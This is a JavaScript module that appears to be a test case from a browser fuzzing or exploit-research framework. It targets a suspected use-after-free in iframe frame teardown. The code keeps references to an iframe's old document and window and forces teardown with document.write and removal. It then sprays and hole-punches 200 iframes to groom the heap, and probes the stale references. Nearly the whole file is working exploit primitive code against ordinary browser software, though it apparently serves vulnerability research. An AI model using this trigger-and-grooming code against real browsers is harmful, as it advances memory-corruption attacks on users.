import { GCOracle } from '../mod_executor.js';
import { Groomer } from '../mod_groomer.js';

export default {
    id:       'IFRAME_DOCWRITE_FRAME_UAF',
    category: 'DOM',
    risk:     'HIGH',
    description:
        'document.write() e navigate forçam teardown do Frame nativo. ' +
        'Refs JS para oldDoc/oldWin retidas pré-teardown acessam Frame freed.',

    setup: async function() {
        this.iframe = document.createElement('iframe');
        this.iframe.style.cssText = 'width:200px;height:100px;position:absolute;top:0;left:0';
        document.body.appendChild(this.iframe);

        await new Promise(resolve => {
            if (this.iframe.contentDocument?.readyState === 'complete') return resolve();
            this.iframe.addEventListener('load', resolve, { once: true });
            this.iframe.src = 'about:blank';
        });

        this.oldWin = this.iframe.contentWindow;
        this.oldDoc = this.iframe.contentDocument;

        try {
            this.oldDoc.body.innerHTML = '<div id="orig">original</div><span>test</span>';
            this.origEl = this.oldDoc.getElementById('orig');
        } catch(e) {}

        // 🚨 Oráculo: Alvo = IFrame e o Document antigo
        if (GCOracle.registry) {
            GCOracle.registry.register(this.iframe, `${this.id}_target`);
            GCOracle.registry.register(this.oldDoc, `${this.id}_target_doc`);
        }
    },

    trigger: async function() {
        try {
            this.oldDoc.open('text/html', 'replace');
            this.oldDoc.write('<!DOCTYPE html><html><head><meta charset="UTF-8"></head>'
                + '<body><p id="new">REWRITTEN</p></body></html>');
            this.oldDoc.close();
        } catch(e) {}

        await new Promise(r => setTimeout(r, 20));

        this.iframe.src = 'about:blank#fuzztarget';
        this.iframe.remove(); 

        // 🚨 Grooming Massivo: O IFrame FrameLoader é enorme na RAM.
        // Vamos alocar centenas de iframes falsos e esburacá-los.
        let nodes = Groomer.sprayDOM('iframe', 200);
        Groomer.punchHoles(nodes, 2);

        await new Promise(r => setTimeout(r, 30));
    },

    probe: [
        s => s.oldDoc.readyState,
        s => s.oldDoc.URL,
        s => s.oldDoc.body?.innerHTML,
        s => s.oldDoc.getElementById?.('new'),       
        s => s.oldDoc.getElementById?.('orig'),      
        s => s.oldWin.location?.href,
        s => s.oldWin.history?.length,
        s => s.oldWin.document === s.iframe.contentDocument,
        s => s.origEl?.isConnected,
        s => s.origEl?.ownerDocument === s.oldDoc,
    ],

    cleanup: function() {
        try { this.iframe.remove(); } catch(e) {}
    }
};
